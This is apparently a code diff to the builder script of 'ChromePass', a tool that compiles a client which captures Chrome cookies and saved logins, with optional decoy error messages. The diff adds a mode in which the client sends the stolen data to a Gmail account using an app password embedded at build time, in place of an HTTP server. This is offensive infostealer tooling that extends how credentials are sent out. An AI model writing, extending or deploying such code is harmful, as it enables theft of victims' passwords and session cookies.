@@ -29,6 +29,8 @@ chromepass_base = config["DIRECTORIES"]["ChromePassBase"]
 chromepass_server = config["DIRECTORIES"]["ChromePassServer"]
 template_base = config["DIRECTORIES"]["ClientTemplateBase"]
 log_dir = config["DIRECTORIES"]["LogDir"]
+email_username = config["EMAIL"]["username"]
+email_password = config["EMAIL"]["password"]
 refresh_env = '$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User");'
 
 
@@ -101,7 +103,7 @@ def copy_icon(src_path, dist_path, linux=False):
         os.remove(dist_path)
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True, sandbox=False):
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True, sandbox=False, email=False, username="", password=""):
     if nobuild:
         return True
     alphabet = "qwertyuiop[]asdfghjkl;'zxcvbnm,./"
@@ -116,7 +118,10 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
             "<<LOGIN_BOOL>>": stringify_bool(login),
             "<<SANDBOX>>": stringify_bool(sandbox),
             "<<PORT>>": str(port),
-            "<<SECRET_KEY>>": secret_key
+            "<<SECRET_KEY>>": secret_key,
+            "<<EMAIL_BOOL>>": stringify_bool(email),
+            "<<USER_NAME>>": username,
+            "<<PASSWORD>>": password,
         },
         {
             "<<SECRET_KEY>>": secret_key
@@ -142,8 +147,8 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
     return False
 
 
-def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
-    if nobuild:
+def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False, email=False):
+    if nobuild or email:
         return True
     replacement_maps = [{
         "<<PORT>>": str(port)
@@ -206,6 +211,12 @@ def parse_arguments():
                         action="store_true", default=False, help="Use this to enable the error message. Default is False")
     parser.add_argument('--message', metavar="Error Message",
                         type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
+    parser.add_argument('--username', metavar="Gmail account",
+                        type=str, help="Gmail account to use if email enabled. If not supplied, default comes from config file.", default=email_username)
+    parser.add_argument('--password', metavar="Gmail app password",
+                        type=str, help="App password to access gmail account. Not your normal password. If not supplied, default comes from config file.", default=email_password)
+    parser.add_argument('--email', dest="email_bool",
+                        action="store_true", default=False, help="Use email instead of http server. By default this is false.")
     parser.add_argument('--nocookies', dest="cookies_bool",
                         action="store_false", default=True, help="Use to not capture cookies. Default is capturing cookies and credentials")
     parser.add_argument('--nologin', dest="login_bool",
@@ -228,9 +239,9 @@ def parse_arguments():
 
     reset_folders()
     server = build_server(
-        port=args.port, nobuild=args.noserver, linux=args.linux)
+        port=args.port, nobuild=args.noserver, linux=args.linux, email=args.email_bool)
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
-                          cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient, sandbox=args.sandbox)
+                          cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient, sandbox=args.sandbox, email=args.email_bool, username=args.username, password=args.password)
     build_message(server, client)
 
 
